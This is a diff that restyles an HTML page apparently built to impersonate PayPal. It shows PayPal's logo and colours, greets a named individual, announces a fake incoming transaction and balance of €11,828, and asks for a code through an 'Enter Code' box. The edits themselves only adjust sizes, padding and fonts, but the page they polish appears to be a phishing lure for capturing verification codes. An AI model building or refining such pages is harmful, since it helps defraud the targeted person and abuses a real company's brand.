@@ -15,35 +15,34 @@
       background: white;
       color: black;
       width: 100%;
-      height: 100%;
+      height: 100vh;
       padding: 25px;
       box-sizing: border-box;
       text-align: center;
-      max-width: 500px;
-      margin: auto;
     }
 
     .logo {
-      width: 120px;
-      margin-bottom: 10px;
+      width: 150px; /* slightly bigger */
+      margin-bottom: 20px;
     }
 
     input {
-      width: 90%;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 6px;
+      width: 100%;
+      padding: 15px;
+      margin: 15px 0;
+      border-radius: 8px;
       border: 1px solid #ccc;
+      font-size: 16px;
     }
 
     button {
-      padding: 12px;
-      width: 95%;
+      padding: 15px;
+      width: 100%;
       background: #0070ba;
       color: white;
       border: none;
-      border-radius: 6px;
-      font-size: 16px;
+      border-radius: 8px;
+      font-size: 18px;
       cursor: pointer;
     }
 
@@ -55,8 +54,8 @@
       display: none;
       margin-top: 20px;
       background: #f5f7fa;
-      padding: 15px;
-      border-radius: 8px;
+      padding: 20px;
+      border-radius: 10px;
     }
 
     #request {
@@ -74,8 +73,8 @@
       border: 4px solid #eee;
       border-top: 4px solid #0070ba;
       border-radius: 50%;
-      width: 30px;
-      height: 30px;
+      width: 40px;
+      height: 40px;
       animation: spin 1s linear infinite;
       margin: auto;
     }
@@ -106,7 +105,7 @@
 
     <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="logo">
 
-    <h3>Welcome Aris Groenendijk</h3>
+    <h2>Welcome Aris Groenendijk</h2>
 
     <p id="transactionText" style="display:none;" class="fade">
       Incoming transaction of €11,828
@@ -120,7 +119,6 @@
     <h3>Enter Code</h3>
 
     <input type="text" id="codeBox" placeholder="Enter code">
-    <br>
 
     <button onclick="checkCode()">Submit</button>
 
@@ -134,8 +132,6 @@
       </h3>
       <p>Your balance: €11,828</p>
     </div>
-
-    <p class="small-text"></p>
 
   </div>
 
